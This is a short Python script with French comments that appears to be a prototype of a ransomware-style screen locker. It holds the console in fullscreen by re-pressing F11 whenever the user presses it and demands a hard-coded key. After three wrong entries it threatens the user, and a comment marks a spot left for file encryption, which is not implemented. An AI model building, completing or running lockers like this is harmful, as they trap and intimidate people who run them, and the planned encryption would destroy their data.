from colored import fg, attr, bg
import os, time, pyautogui, threading, keyboard

# Var
response = "azerty"
wait_until_block = 0

# Paramètres du cmd
os.system("@echo off")
os.system("title Password")
os.system("cls")
pyautogui.press("F11")

# Fonction pour bloquer la fenêtre en plein écran
def WaitF11():
    while True:
        keyboard.wait("F11") # Attendre que la personne appuie sur F11 (ça fonctionne comme un time.sleep mais avec une condition à la place d'un temps d'attente)
        pyautogui.press("F11") # Lorsque elle appuie alors on réappuie sur la touche (avec pyautogui prcq quand on le fait avec keyboard ça spam)
        

# Fonction principale
def Main():
    
    global wait_until_block # Rendre la variable globale (pour pouvoir la modifier depuis la fonction)
    
    while True: 
        os.system("color 40")
        os.system("cls")
        
        user_response = input(f"{fg(0)}{bg(1)}Entrez votre clé ici: \n{attr(0)}") # L'utilisateur entre la clé

        if user_response == response: # Si la valeur entrée est correcte
            print(f"{fg(2)}{bg(1)}Clé valide{attr(0)}")
            print(f"{fg(0)}{bg(1)}Appuyez sur une touche pour quitter{attr(0)}")
            os.system("pause >nul")
            os.system("exit")
        
        else: # Clé invalide
            print(f"{fg(88)}{bg(1)}Clé invalide{attr(0)}")
            wait_until_block += 1
            time.sleep(0.5)
            if wait_until_block >= 3: # Si l'utilisateur entre une clé invalide 3 fois ou +
                # Cryptage de fichier et autres
                print("tu as utilisé tes trois essais, ton pc est dans la sauce")
                

# Threads
main = threading.Thread(target=Main)
wait_f11 = threading.Thread(target=WaitF11)

# Liste des threads
threads = [main, wait_f11]

# Lancer les threads un par un
for thread in threads: thread.start()
for thread in threads: thread.join()
